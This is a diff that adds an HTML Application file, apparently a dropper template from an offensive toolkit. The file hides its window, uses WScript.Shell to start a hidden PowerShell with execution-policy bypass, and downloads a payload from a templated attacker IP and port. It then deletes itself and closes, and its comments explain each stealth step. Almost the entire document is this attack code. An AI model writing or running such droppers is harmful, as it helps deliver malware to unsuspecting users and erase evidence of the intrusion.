@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <HTA:APPLICATION ID="CS"
+      APPLICATIONNAME="Downloader"
+      WINDOWSTATE="minimize"
+      MAXIMIZEBUTTON="no"
+      MINIMIZEBUTTON="no"
+      CAPTION="no"
+      SHOWINTASKBAR="no">
+
+    <script>
+      //We will use Wscript.shell in order to launch PowerShell
+      a = new ActiveXObject('Wscript.Shell');
+
+      //Our command to execute
+      cmd = "powershell -windowstyle hidden -ep Bypass -nop -noexit -c ((New-Object Net.WebClient).DownloadString('http://{{IP}}:{{PORT}}/public/{{PAYLOAD_NAME}}'))";
+
+      //Run the command, 0 is needed so that no PowerShell window will appear
+      a.Run(cmd,0);
+
+      //We use this in order to get erase the HTA file after it has executed
+      b = new ActiveXObject("Scripting.FileSystemObject");
+
+      //Get filename and edit it so that windows can read it properly
+      filename = window.location.href;
+      filename = decodeURI(filename);
+      filename = filename.slice(8);
+
+      //Get a handle on the file
+      c = b.GetFile(filename);
+
+      //Delete it
+      c.Delete();
+
+      //Close the MSHTA window
+      window.close();
+    </script>
+
+  </head>
+<body>
+</body>
+</html>
